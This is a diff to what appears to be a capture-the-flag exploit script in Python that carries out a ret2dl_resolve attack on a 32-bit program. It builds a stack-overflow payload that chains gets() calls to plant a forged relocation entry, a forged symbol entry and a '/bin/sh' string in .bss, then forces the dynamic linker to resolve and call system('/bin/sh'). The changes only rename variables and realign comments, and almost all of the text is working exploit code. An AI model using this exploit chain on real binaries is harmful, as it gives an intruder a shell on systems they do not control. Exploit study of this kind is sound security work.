@@ -41,46 +41,46 @@ pop_ret = 0x08049022
 # |-----------+---------------------------+---------|
 # |           |                           |         |
 
-Elf32_Rel_addr = bss
+fake_elf32_rel_addr = bss
 
-Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+fake_elf32_sym_addr = fake_elf32_rel_addr + 0x10
 
-system_symbol_addr = Elf32_Sym_addr + 0x14
+system_symbol_addr = fake_elf32_sym_addr + 0x14
 
 sh_symbol_addr = system_symbol_addr + 0x1c
 
 # calc index of Elf32_Rel from .rel.plt
-reloc_arg = Elf32_Rel_addr - rel
+reloc_arg = fake_elf32_rel_addr - rel
 
 # padding
-buf = b'A'*0x84                 # fill stack
-buf += p32(0xdeadbeaf)         # saved_ebp
+buf = b'A'*0x84                  # fill stack
+buf += p32(0xdeadbeaf)           # saved_ebp
 
-# gets(Elf32_Rel_addr)
-buf += p32(gets_plt)           # main return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(Elf32_Rel_addr)     # gets arg
+# gets(fake_elf32_rel_addr)
+buf += p32(gets_plt)             # main return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(fake_elf32_rel_addr)  # gets arg
 
-# gets(Elf32_Sym_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(Elf32_Sym_addr)     # gets arg
+# gets(fake_elf32_sym_addr)
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(fake_elf32_sym_addr)  # gets arg
 
 # gets(system_symbol_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return addr
-buf += p32(system_symbol_addr) # gets arg
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return addr
+buf += p32(system_symbol_addr)   # gets arg
 
 # gets(sh_symbol_addr)
-buf += p32(gets_plt)           # pop ret return addr
-buf += p32(pop_ret)            # gets return  addr
-buf += p32(sh_symbol_addr)     # gets arg
+buf += p32(gets_plt)             # pop ret return addr
+buf += p32(pop_ret)              # gets return  addr
+buf += p32(sh_symbol_addr)       # gets arg
 
 # system('/bin/sh')
-buf += p32(plt)                # pop ret return addr
-buf += p32(reloc_arg)          # reloc arg
-buf += p32(0xdeadbeef)         # padding
-buf += p32(sh_symbol_addr)     # system arg
+buf += p32(plt)                  # pop ret return addr
+buf += p32(reloc_arg)            # reloc arg
+buf += p32(0xdeadbeef)           # retrun address of system
+buf += p32(sh_symbol_addr)       # system arg
 
 conn.sendline(buf)
 
@@ -93,7 +93,7 @@ conn.sendline(buf)
 # } Elf32_Rel;
 ###################################################################################
 r_offset = gets_got
-r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+r_info   = ((fake_elf32_sym_addr - dynsym)//0x10)<<8 | 7
 
 # |-----------+---------------------------+---------|
 # | Elf32_Rel | r_offset                  | 8 byte  |
